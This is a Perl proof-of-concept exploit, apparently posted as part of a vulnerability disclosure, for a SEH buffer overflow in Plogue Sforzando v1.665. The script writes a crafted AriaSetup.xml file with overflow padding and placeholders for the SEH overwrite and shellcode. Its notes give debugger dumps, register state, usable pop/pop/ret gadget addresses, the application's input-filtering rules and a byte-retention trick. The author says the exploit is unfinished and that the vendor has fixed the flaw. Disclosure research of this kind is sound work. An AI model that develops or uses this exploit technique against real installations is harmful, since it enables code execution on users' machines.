#!/usr/bin/perl

##########################################################################################
# Exploit Title: Plogue Sforzando v1.665 Buffer Overflow POC
# Date Discovered: 10-29-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: Sforzando v1.665
# Software Link: http://www.softpedia.com/dyn-postdownload.php?p=227357&t=0&i=1
# Vendor site: http://www.plogue.com/downloads/ 
# Version: 1.665
# Tested On: Windows XP SP3
##########################################################################################
# Timeline
# - 10-29: Vuln discovered, vendor contacted
# - 10-30: Vendor acknowleged receipt of bug report
# - 10-31: Vendor applied fix to software installers
##########################################################################################
# At first glance this seems to be a straightforward SEH BOF however it's not the case
# largely due to the way the application treats non-ASCII input (see notes after POC code)
# Refer to the notes at the end of POC code for more details
##########################################################################################


# The application loads the AriaSetup.xml file at launch and reads the product value
# By changing these values we can generate a BOF as follows

my $buffsize = 15000; # sets buffer size for consistent sized payload

# build the start of the xml file
my $header = '<?xml version="1.0" ?><Key>key</Key><AriaSetup version="1665">';
$header = $header . '<Property name="vendor" value="Plogue Art et Technologie, Inc"/>';
$header = $header . '<Property name="product" value="';

my $junk = "\x41" x 392; # 392 is the offset of next seh followed by 4920 bytes of controllable data
my $nseh = "\x42\x42\x42\x42"; # overwrite next seh
my $seh  = "\x43\x43\x43\x43"; # overwrite seh (and EIP, offset 396)
my $shell = "\x45" x 5000; # placeholder for shell code; also accessible via ESP+2500 (length 4916)

my $sploit = $junk.$nseh.$seh.$nops.$shell; # assemble exploit portion of buffer
my $fill = "\x46" x ($buffsize - (length($header)+length($sploit))); # fill remainder of buffer 
my $buffer = $header.$sploit.$fill; # construct the final buffer

# write the exploit buffer to file
my $file = "AriaSetup.xml";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer) . "\n"; 


#############################################
#------------------- NOTES------------------#
#############################################

# after the above POC, seh chain looks like this:

# Address    SE handler
# 0012E31C   ntdll.7C9032BC
# 0012ECC4   43434343
# 42424242   *** CORRUPT ENTRY ***

# And the stack...
#	  ...
# 0012ECB0   41414141  AAAA
# 0012ECB4   41414141  AAAA
# 0012ECB8   41414141  AAAA
# 0012ECBC   41414141  AAAA
# 0012ECC0   41414141  AAAA
# 0012ECC4   42424242  BBBB  Pointer to next SEH record
# 0012ECC8   43434343  CCCC  SE handler
# 0012ECCC   44444444  DDDD
# 0012ECD0   44444444  DDDD
# 0012ECD4   44444444  DDDD
# 0012ECE0   44444444  DDDD
# 0012ECE4   44444444  DDDD
#	  ...

# And the registers...

# EAX 00000000
# ECX 43434343
# EDX 7C9032BC ntdll.7C9032BC
# EBX 00000000
# ESP 0012E308
# EBP 0012E328
# ESI 00000000
# EDI 00000000
# EIP 43434343

# So, next SEH is overwritten at offset 392, SEH (and EIP) at 396 
# and there is plenty of room directly following for shellcode

# The problem that we have for an SEH BOF are the available pop/pop/ret and the input sanitization performed by the application
# Here are the 14 available pop/pop/ret found by mona (using -all switch)

# 0x72d11f39 : pop edi pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d1170b : pop esi pop ebx ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d1204e : pop esi pop ebx ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d115b8 : pop ebx pop ebp ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d1263d : pop edi pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d1269c : pop edi pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x00280b0b : call dword ptr ss:[ebp+30] | startnull,ascii {PAGE_READONLY}
# 0x72d119de : pop esi pop ebp ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d11225 : pop edi pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d1283f : pop eax pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d12899 : pop eax pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d128f3 : pop eax pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d12956 : pop eax pop esi ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d12ebe : pop ebx pop ebp ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)
# 0x72d12f35 : pop ebx pop ebp ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msacm32.drv)

# The application only accepts certain characters as input, limited primarily to the ASCII character set, with some exceptions:
#
# All ASCII characters \x0a through \x7f appear to be accepted as-is except as follows:
# - \x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x26 -- these are stripped entirely 
# - \x22 appears to be processed as a double quote and terminates the remainder of the xml string input
# - \x0a is replaced with \x0d

# Anything outside of the ASCII range appears to be stripped (or sometimes replaced)
# This poses a problem when trying to find a usable address for our overwrites

# For example, given the pop/pop/ret addresses found, we would need to include \xd1

# If we try to overwrite SEH with the the address 0x72d11225 (\x25\x12\xd1\x72) we get this: 

# 0012ECBC   41414141  AAAA
# 0012ECC0   41414141  AAAA
# 0012ECC4   42424242  BBBB  Pointer to next SEH record
# 0012ECC8   44721225  %%%D  SE handler
# 0012ECCC   44444444  DDDD
# 0012ECD0   44444444  DDDD

# Notice how \xd1 is stripped (and our trailing input shifted).  
# Through a bit of basic trial and error I noticed that you can 
# force the application to retain input chars by appending other chars to it. 
# For example to maintain \xd1 we can append \xa9 to it 

# An SEH overwrite of \x25\x12\xd1\xa9\x72 would result in:

# 0012ECBC   41414141  AAAA
# 0012ECC0   41414141  AAAA
# 0012ECC4   42424242  BBBB  Pointer to next SEH record
# 0012ECC8   A9D11225  %%%%  SE handler
# 0012ECCC   44444472  rDDD
# 0012ECD0   44444444  DDDD

# This time \xd1 is maintained but unfortunately, the app also maintains the appended \xa9 byte
# which makes this approach innefective for addressing (but possibly useful for shellcode)

# I didn't have the time to investigate this any further but I figured I'd post this POC
# in case someone else wants to give it a go